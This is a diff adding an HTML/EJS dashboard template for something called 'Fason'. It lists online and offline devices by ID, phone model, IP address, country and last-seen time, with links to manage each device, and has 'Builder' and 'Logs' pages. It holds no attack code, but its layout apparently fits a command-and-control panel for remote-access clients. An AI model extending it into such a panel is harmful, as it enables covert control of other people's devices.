@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fason - Dashboard</title>
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+<body>
+    <nav class="navbar">
+        <a href="/" class="brand"><span class="fs-icon-sm">FS</span> Fason</a>
+        <div class="nav-links">
+            <a href="/" class="active">Dashboard</a>
+            <a href="/builder">Builder</a>
+            <a href="/logs">Logs</a>
+            <a href="/logout">Logout</a>
+        </div>
+    </nav>
+
+    <main class="container">
+        <section class="card">
+            <h2 class="card-title">
+                <span class="status-dot online"></span>
+                Online Devices (<%= online.length %>)
+            </h2>
+            
+            <% if (online.length === 0) { %>
+            <p class="empty">No devices online</p>
+            <% } else { %>
+            <div class="table-wrap">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>ID</th>
+                            <th>Device</th>
+                            <th>IP</th>
+                            <th>Country</th>
+                            <th>Last Seen</th>
+                            <th></th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <% online.forEach(c => { %>
+                        <tr>
+                            <td><code><%= c.id %></code></td>
+                            <td><%= c.device?.brand %> <%= c.device?.model %></td>
+                            <td><%= c.ip %></td>
+                            <td><%= c.country || '—' %></td>
+                            <td><%= new Date(c.lastSeen).toLocaleString() %></td>
+                            <td><a href="/device/<%= c.id %>" class="btn small">Manage</a></td>
+                        </tr>
+                        <% }) %>
+                    </tbody>
+                </table>
+            </div>
+            <% } %>
+        </section>
+
+        <section class="card">
+            <h2 class="card-title">
+                <span class="status-dot offline"></span>
+                Offline Devices (<%= offline.length %>)
+            </h2>
+            
+            <% if (offline.length === 0) { %>
+            <p class="empty">No offline devices</p>
+            <% } else { %>
+            <div class="table-wrap">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>ID</th>
+                            <th>Device</th>
+                            <th>IP</th>
+                            <th>Country</th>
+                            <th>Last Seen</th>
+                            <th></th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <% offline.forEach(c => { %>
+                        <tr class="muted">
+                            <td><code><%= c.id %></code></td>
+                            <td><%= c.device?.brand %> <%= c.device?.model %></td>
+                            <td><%= c.ip %></td>
+                            <td><%= c.country || '—' %></td>
+                            <td><%= new Date(c.lastSeen).toLocaleString() %></td>
+                            <td><a href="/device/<%= c.id %>" class="btn small outline">View</a></td>
+                        </tr>
+                        <% }) %>
+                    </tbody>
+                </table>
+            </div>
+            <% } %>
+        </section>
+    </main>
+
+    <script src="/js/app.js"></script>
+</body>
+</html>
